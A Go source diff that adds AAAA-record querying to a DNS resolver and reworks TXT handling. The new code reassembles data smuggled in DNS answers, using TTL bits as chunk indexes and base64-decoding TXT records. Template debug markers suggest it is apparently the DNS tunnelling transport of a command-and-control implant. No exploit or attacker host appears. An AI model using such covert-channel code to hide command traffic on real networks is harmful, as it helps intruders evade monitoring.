@@ -39,7 +39,7 @@ var (
 )
 
 // NewGenericResolver - Instantiate a new generic resolver
-func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration) DNSResolver {
+func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration, parent string) DNSResolver {
 	if retries < 1 {
 		retries = 1
 	}
@@ -52,6 +52,7 @@ func NewGenericResolver(address string, port string, retryWait time.Duration, re
 			WriteTimeout: timeout,
 		},
 		base64: encoders.Base64Encoder{},
+		parent: parent,
 	}
 }
 
@@ -62,6 +63,7 @@ type GenericResolver struct {
 	retryWait time.Duration
 	resolver  *dns.Client
 	base64    encoders.Base64Encoder
+	parent    string
 }
 
 // Address - Return the address of the resolver
@@ -114,6 +116,87 @@ func (r *GenericResolver) a(domain string) ([]byte, time.Duration, error) {
 	return records, rtt, err
 }
 
+// AAAA - Query for AAAA records
+func (r *GenericResolver) AAAA(domain string) ([]byte, time.Duration, error) {
+	var resp []byte
+	var rtt time.Duration
+	var err error
+	for attempt := 0; attempt < r.retries; attempt++ {
+		resp, rtt, err = r.aaaa(domain)
+		if err == nil {
+			break
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
+		// {{end}}
+		time.Sleep(r.retryWait)
+	}
+	return resp, rtt, err
+}
+
+func (r *GenericResolver) aaaa(domain string) ([]byte, time.Duration, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[dns] %s->AAAA record of %s ?", r.address, domain)
+	// {{end}}
+	resp, rtt, err := r.localQuery(domain, dns.TypeAAAA)
+	if err != nil {
+		return nil, rtt, err
+	}
+	if resp.Rcode != dns.RcodeSuccess {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] error response status: %v", resp.Rcode)
+		// {{end}}
+		return nil, rtt, ErrInvalidRcode
+	}
+	records := make([]byte, 512)
+	dataSize := uint32(0)
+
+	if len(resp.Answer) > 0 {
+		for _, answer := range resp.Answer {
+			switch answer := answer.(type) {
+			case *dns.AAAA:
+				// {{if .Config.Debug}}
+				log.Printf("[dns] answer (aaaa): %v", answer.AAAA)
+				// {{end}}
+
+				chunkMeta := uint32(answer.Hdr.Ttl)
+				chunkIdx := (chunkMeta & 0xff00) >> 8
+				// {{if .Config.Debug}}
+				log.Printf("[dns] chunk idx: %d", chunkIdx)
+				// {{end}}
+
+				tempSize := chunkMeta & 0xff
+				if dataSize != 0 {
+					if tempSize != dataSize {
+						// {{if .Config.Debug}}
+						log.Printf("[dns] inconsistent record size. should all be the same: %d", tempSize)
+						// {{end}}
+						return nil, rtt, ErrInvalidResponse
+					}
+				} else {
+					dataSize = tempSize
+				}
+
+				copy(records[chunkIdx*16:], []byte(answer.AAAA))
+				//records = append(records, []byte(answer.AAAA)...)
+			}
+		}
+		// {{if .Config.Debug}}
+	} else {
+		log.Printf("[dns] answer (aaaa): no records returned")
+		// {{end}}
+	}
+
+	data := []byte{}
+	if dataSize > 0 {
+		// Trim output data
+		data = make([]byte, dataSize)
+		copy(data, records[0:dataSize])
+	}
+
+	return data, rtt, err
+}
+
 // TXT - Query for TXT records
 func (r *GenericResolver) TXT(domain string) ([]byte, time.Duration, error) {
 	var resp []byte
@@ -145,18 +228,24 @@ func (r *GenericResolver) txt(domain string) ([]byte, time.Duration, error) {
 	}
 
 	records := ""
-	for _, answer := range resp.Answer {
-		switch answer := answer.(type) {
-		case *dns.TXT:
-			// {{if .Config.Debug}}
-			log.Printf("[dns] answer (txt): %v", answer.Txt)
-			// {{end}}
-			records += strings.Join(answer.Txt, "")
-		}
-	}
 	data := []byte{}
-	if 0 < len(records) {
-		data, err = r.base64.Decode([]byte(records))
+	if len(resp.Answer) > 0 {
+		for _, answer := range resp.Answer {
+			switch answer := answer.(type) {
+			case *dns.TXT:
+				// {{if .Config.Debug}}
+				log.Printf("[dns] answer (txt): %v", answer.Txt)
+				// {{end}}
+				records += strings.Join(answer.Txt, "")
+			}
+		}
+		if 0 < len(records) {
+			data, err = r.base64.Decode([]byte(records))
+		}
+		// {{if .Config.Debug}}
+	} else {
+		log.Printf("[dns] answer (txt): no records returned")
+		// {{end}}
 	}
 	return data, rtt, err
 }
